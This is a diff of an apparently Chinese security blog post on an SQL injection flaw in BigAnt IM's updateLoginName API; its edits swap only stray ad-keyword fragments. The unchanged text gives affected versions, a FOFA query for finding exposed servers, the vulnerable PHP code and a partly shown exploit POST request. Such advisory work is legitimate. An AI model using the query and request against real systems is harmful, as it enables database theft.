@@ -8,6 +8,8 @@ asset_dir: embedded-base64
 
 杭州九麒科技大蚂蚁 (BigAnt) 即时通讯系统是一款企业级IM通信管理系统，提供多种功能支持。该系统的 \Api\Controller\UserController::updateLoginName 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可通过在 updateLoginName 功能的相关参数中插入恶意构造的 SQL 查询语句，实现对后端数据库的非法操作，可能导致敏感信息泄露、数据篡改、绕过身份验证，甚至在特定配置下实现任意命令执行或获取系统控制权限。
 
+短信和即时消息
+
 # 影响版本
 
 BigAnt 5.5.x 及以上版本用户
@@ -16,21 +18,19 @@ BigAnt 5.5.x 及以上版本用户
 
 经过测试，最新版本 6.0.1.20250407.1 也受影响
 
-短信和即时消息
+编程
 
 深入探索
 
-认证
+安全审计服务
 
-MySQL
+漏洞利用分析
 
-安全运维咨询
+漏洞利用手册
 
 # fofa语法
 
 > (body="/Public/static/admin/admin\_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"
->
-> SQL注入检测工具
 
 # 漏洞分析
 
@@ -44,6 +44,14 @@ MySQL
 - `I()` 函数虽有基本过滤，但不能完全防止 [SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)（特别是在字符串拼接场景下）
 
 但是部分控制器的部分方法如**UserController.class.php**下的**updateLoginName()**方法中
+
+深入探索
+
+加密U盘
+
+安全研究工具
+
+安全
 
 ```
 public function updateLoginName()
@@ -67,21 +75,13 @@ public function updateLoginName()
         }
 ```
 
-深入探索
-
-安全
-
-CRM
-
-漏洞扫描器
-
 `$userId`来自用户请求参数 `$this->q('user_id',1);`，直接拼接到 `where('user_id = '.$userId)->getField('user_login')`字符串中，攻击者可通过构造恶意 `user_id`参数注入SQL payload造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。
 
 # 漏洞复现
 
 > 认证码参考[大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html) 的权限分析部分
 >
-> 代码安全审计
+> 漏洞扫描服务
 
 ```
 POST /api/user/updateLoginName HTTP/1.1
@@ -95,4 +95,4 @@ authen=cc7e6a614831d1c6b351a5f12678ed4b94cf98b2a52b1050d6c19433fdeff37d&uid=1&us
 
 成功利用报错注入获取到数据库用户信息。
 
-漏洞扫描服务
+数据管理
